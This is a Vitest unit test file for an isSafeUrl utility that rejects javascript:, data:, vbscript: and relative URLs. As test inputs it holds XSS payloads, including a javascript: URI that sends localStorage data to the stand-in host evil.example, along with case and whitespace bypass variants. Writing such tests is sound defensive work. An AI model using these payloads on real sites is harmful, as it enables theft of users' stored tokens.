import { describe, it, expect } from "vitest";
import { isSafeUrl } from "@/utils/is-safe-url";

describe("isSafeUrl", () => {
  it("allows http and https URLs", () => {
    expect(isSafeUrl("http://example.com")).toBe(true);
    expect(isSafeUrl("https://example.com/path?query=1")).toBe(true);
  });

  it("rejects javascript: URIs", () => {
    expect(isSafeUrl("javascript:alert(1)")).toBe(false);
  });

  // The concrete PoC payload from the proposal — contains "https://" as a
  // substring, which is exactly what makes a naive substring/unanchored
  // regex check unsafe here.
  it("rejects a javascript: URI that embeds an https:// substring", () => {
    expect(
      isSafeUrl(
        "javascript:fetch('https://evil.example/steal?t='+localStorage.getItem('application'))",
      ),
    ).toBe(false);
  });

  it("rejects javascript: regardless of case", () => {
    expect(isSafeUrl("JavaScript:alert(1)")).toBe(false);
    expect(isSafeUrl("JAVASCRIPT:alert(1)")).toBe(false);
  });

  it("rejects javascript: with leading/embedded whitespace or control characters", () => {
    expect(isSafeUrl("  javascript:alert(1)")).toBe(false);
    expect(isSafeUrl("java\nscript:alert(1)")).toBe(false);
    expect(isSafeUrl("java\tscript:alert(1)")).toBe(false);
  });

  it("rejects data: and vbscript: URIs", () => {
    expect(isSafeUrl("data:text/html,<script>alert(1)</script>")).toBe(false);
    expect(isSafeUrl("vbscript:msgbox(1)")).toBe(false);
  });

  it("rejects relative and protocol-relative URLs (no base resolution)", () => {
    expect(isSafeUrl("/relative/path")).toBe(false);
    expect(isSafeUrl("//evil.example/path")).toBe(false);
    expect(isSafeUrl("not-a-url")).toBe(false);
  });

  it("rejects non-string input", () => {
    expect(isSafeUrl(null)).toBe(false);
    expect(isSafeUrl(undefined)).toBe(false);
    expect(isSafeUrl(42)).toBe(false);
    expect(isSafeUrl({})).toBe(false);
  });

  it("rejects mailto: by default", () => {
    expect(isSafeUrl("mailto:author@example.com")).toBe(false);
  });

  it("allows mailto: only when allowMailto is set", () => {
    expect(isSafeUrl("mailto:author@example.com", { allowMailto: true })).toBe(
      true,
    );
  });

  it("still rejects javascript: even when allowMailto is set", () => {
    expect(isSafeUrl("javascript:alert(1)", { allowMailto: true })).toBe(false);
  });

  it("rejects tel: even when allowMailto is set", () => {
    expect(isSafeUrl("tel:+15555555555", { allowMailto: true })).toBe(false);
  });
});
